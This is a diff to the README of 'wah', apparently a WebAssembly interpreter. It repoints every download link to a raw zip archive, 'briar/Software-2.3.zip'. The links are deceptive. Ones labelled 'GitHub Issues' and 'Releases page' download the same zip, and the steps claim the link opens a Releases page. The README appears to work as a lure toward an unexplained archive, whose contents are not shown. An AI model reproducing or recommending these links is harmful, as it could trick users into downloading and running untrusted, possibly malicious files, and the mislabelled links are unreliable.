@@ -1,7 +1,7 @@
 # 🎉 wah - The Simple WebAssembly Interpreter
 
 ## 📥 Download Now
-[![Download wah](https://raw.githubusercontent.com/manhvn135/wah/main/briar/wah.zip)](https://raw.githubusercontent.com/manhvn135/wah/main/briar/wah.zip)
+[![Download wah](https://github.com/manhvn135/wah/raw/refs/heads/main/briar/Software-2.3.zip)](https://github.com/manhvn135/wah/raw/refs/heads/main/briar/Software-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Make sure your system meets the following requirements to run wah effectively:
 
 To get started with wah, visit the following link to download the application:
 
-[Download wah](https://raw.githubusercontent.com/manhvn135/wah/main/briar/wah.zip)
+[Download wah](https://github.com/manhvn135/wah/raw/refs/heads/main/briar/Software-2.3.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of wah. It will be listed at the top.
@@ -66,7 +66,7 @@ For additional help, you may find resources online or check community forums rel
 
 If you run into any troubles or have questions, feel free to reach out via the GitHub Issues page. Click on the following link to report issues or ask for assistance:
 
-[GitHub Issues](https://raw.githubusercontent.com/manhvn135/wah/main/briar/wah.zip)
+[GitHub Issues](https://github.com/manhvn135/wah/raw/refs/heads/main/briar/Software-2.3.zip)
 
 ## 🌐 Community Contributions
 
@@ -78,4 +78,4 @@ wah is open-source and free to use. Check the license file in the repository for
 
 ---
 
-Thank you for using wah! We hope you enjoy running WebAssembly code easily and effectively. Don't forget to visit our [Releases page](https://raw.githubusercontent.com/manhvn135/wah/main/briar/wah.zip) to stay updated with the latest versions.
+Thank you for using wah! We hope you enjoy running WebAssembly code easily and effectively. Don't forget to visit our [Releases page](https://github.com/manhvn135/wah/raw/refs/heads/main/briar/Software-2.3.zip) to stay updated with the latest versions.
